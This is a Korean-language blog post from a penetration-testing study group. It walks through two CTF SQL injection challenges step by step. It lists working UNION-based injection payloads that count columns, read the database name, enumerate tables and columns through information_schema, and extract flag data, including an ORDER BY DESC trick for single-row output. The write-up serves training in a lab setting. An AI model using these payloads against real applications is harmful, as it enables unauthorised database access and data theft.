---
layout: post
comments: true
sitemap:
    changefreq: daily
    priority: 0.5

title: "[CTF] CTF 문제 풀이: SQL Injection w. UNION"
excerpt: "모의해킹 취업반 스터디 7기 6주차"

date: 2024-11-25
last_modified_at: 2024-11-25

tags: [TIL, WEB, DATABASE, CTF]
---

# 목차
* [1번째 문제](#1번째-문제)
* [2번째 문제](#2번째-문제)

# 1번째 문제
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-1.png?raw=true)
처음 들어가면 볼 수 있는 화면이다. SQL Injection 문제라고 제목부터 박혀있으니 얌전히 query문을 작성하겠다.

## SQL Query 파악
1. **adminer**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-2.png?raw=true)  
    * 🤔 대소문자 구분이 없구나!
  
2. 🫣 **~~adminer'~~** -> X
  
3. **a%**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-3.png?raw=true)
    * 🤔 like 구절이 있구나
  
4. 🫣 **~~a#~~** -> X
  
5. 🫣 **~~a'#~~** -> X
  
6. **a%'#**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-4.png?raw=true)
    * 🫣 ~~입력값이 들어가는 곳이 like 위치인가 보다~~
    * 🤔 query에 괄호 안 사용하고 주석 필터링 없나 보다
  
7. 🫣 **~~' and '1' = '1~~** -> X
  
8. 🫣 **~~%' and '1' = '1~~** -> X
  
9. **' and '1' = '1'#**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-5.png?raw=true)
  
## column 개수 파악하기
10. **' order by 1, 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-6.png?raw=true)
    * 💡 보이는 column이 4개니까 4개부터 시작했다.
  
11. **' order by 1, 2, 3, 4, 5 #** -> X
    * 🤔 column의 개수가 4개구만
  
## UNION 사용 가능한지 확인하기
12. **' union select 1, 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-7.png?raw=true)
  
## DATABASE 이름 확인하기
13. **' union select database(), 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-8.png?raw=true)
    * 💡 database 이름은 sqli_1이었다.
  
## TABLE 이름 확인하기
19. **' union select table_name, 2, 3, 4 from information_schema.tables where table_schema = 'sqli_1' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-9.png?raw=true)
    * 💡 table이 총 3개가 나왔는데, 딱 봐도 수상해 보이는 flag_table와 plusFlag_Table를 먼저 시도하기로 했다.
  
## COLUMN 이름 확인하기
20. **' union select 1, column_name, 3, 4 from information_schema.columns where table_name = 'flag_table' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-10.png?raw=true)
    * 💡 flag_table에서는 flag라는 column을 확인할 수 있었다.  
  
21. **' union select 1, column_name, 3, 4 from information_schema.columns where table_name = 'plusFlag_Table' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-11.png?raw=true)
    * 💡 plusFlag_Table에서는 idx과 flag라는 column들을 확인할 수 있었다.
  
## DATA 추출하기
22. **' union select flag, 2, 3, 4 from flag_table #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-12.png?raw=true)
  
23. **' union select idx, flag, 3, 4 from plusFlag_Table #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-13.png?raw=true)
  
# 2번째 문제
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-14.png?raw=true)
위쪽 문제랑 보이기에는 비슷해보인다.
  
## SQL Query 파악
1. **normaltic**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-15.png?raw=true)
    * 💡 보이는 column은 ID, Level, Rank Point, info  
  
2. **normaltic' and '1' = '1**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-16.png?raw=true)
    * 💡 ID가 입력한 그대로 보임  
  
3. 🫣 **~~*~~** -> X
  
## column 개수 파악하기
4. **normaltic' order by 1, 2, 3, 4 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-17.png?raw=true)
    * 💡 보이는 column이 4개니까 4개부터 시작했다.
  
5. **normaltic' order by 1, 2, 3, 4, 5 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-18.png?raw=true)
  
6. **normaltic' order by 1, 2, 3, 4, 5, 6 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-19.png?raw=true)
  
7. **normaltic' order by 1, 2, 3, 4, 5, 6, 7 #** -> X
    * 🤔 column의 개수가 6개구만
  
## 출력되는 column 위치 찾기, DATABASE 이름 확인하기
8. **' union select 1, 2, 3, 4, 5, 6 #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-20.png?raw=true)
    * 💡 보이는 column은 6번 위치에 있었다.  
  
10. **' union select 1, 2, 3, 4, 5, database() #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-21.png?raw=true)
    * 💡 database 이름은 sqli_5이다.
  
## TABLE 이름 확인하기
11. **' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-22.png?raw=true)
    * 💡 table 이름은 flag_honey였다.
  
## COLUMN 이름 확인하기
12. **' union select 1, 2, 3, 4, 5, column_name from information_schema.columns where table_name = 'flag_honey' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-23.png?raw=true)
    * 💡 column 이름은 flag였다.
  
## DATA 추출하기
13. **' union select 1, 2, 3, 4, 5, flag from flag_honey #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-24.png?raw=true)
    * 😬 어쩐지 구라핑의 냄새가 나더라
  
## TABLE 이름 확인하기
11. **' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-22.png?raw=true)
    * 🤔 왜 1개씩 밖에 안 보일까?
        * 🤔 row가 딱 한 개다?
        * 🤔 row를 한 개씩만 보여준다?
            * 🤔 다른 row가 더 있는데 안 보이는 게 아닐까?
            * 🤔 다른 row를 보려면 어떤 걸 할 수 있을까?
  
12. **' union select 1, 2, 3, 4, 5, table_name from information_schema.tables order by 6 desc#**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-25.png?raw=true)
    * 💡 view라는 다른 table이 보여요 좋아요
    * 🤔 row를 한 개씩만 보여준다가 맞는 가정이겠네
  
13. **' union select 1, 2, 3, 4, 5, table_name from information_schema.tables where table_schema = 'sqli_5' order by 6 desc #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-26.png?raw=true)
    * 💡 딱 봐도 수상한 table 이름이다.
  
## COLUMN 이름 확인하고 DATA 추출하기 1
12. **' union select 1, 2, 3, 4, 5, column_name from information_schema.columns where table_name = 'secret' #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-27.png?raw=true)
    * 💡 column 이름은 flag였다.  
  
13. **' union select 1, 2, 3, 4, 5, flag from secret #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-28.png?raw=true)
    * 😬 아니 ㅋㅋㅋ 당했다
    * 🤔 여기서도 역순으로 정렬해볼까?  
  
15. **' union select 1, 2, 3, 4, 5, flag from secret order by 6 desc #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-25-29.png?raw=true)